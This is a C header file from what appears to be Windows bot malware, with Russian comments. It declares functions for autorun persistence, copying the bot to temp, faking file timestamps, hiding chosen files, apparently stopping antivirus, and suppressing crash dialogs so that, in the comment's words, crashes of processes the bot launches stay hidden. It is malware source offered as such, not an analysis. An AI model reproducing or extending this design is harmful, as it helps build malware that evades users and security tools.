#include <windows.h>

DWORD SignalFirstRun( DWORD dwParam );
DWORD GetNameHash( WCHAR *Path );
DWORD GetBotHash();


WCHAR *GetBotPath();
WCHAR *GetStopAVPath();
WCHAR *GetMiniAVPath();

WCHAR *GetTempName();


WCHAR *GetNameFromPath( WCHAR *Path );
WCHAR *GetShellFoldersKey( DWORD dwParam );

void AddToAutoRun( WCHAR *ModulePath );
void CopyFileToTemp( WCHAR *Path, WCHAR *Temp );
void AddToAutoRun( WCHAR *TempFileName );
void SetFakeFileDateTime( WCHAR *Path );


//----------------------------------------------------------------------------
//  IsHideFile - Функция возвращает истину, если необходимо спрятать
//               указанный файл
//----------------------------------------------------------------------------
BOOL IsHide( DWORD dwFileHash );
BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen);

//----------------------------------------------------------------------------
// DisableShowFatalErrorDialog - функция устанавливает режим отображения
//         ошибок при котором система не будет отображать сообщение о крахе
//         процесса. Тем самым мы скроем крах запущенных ботом процессов
//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog();
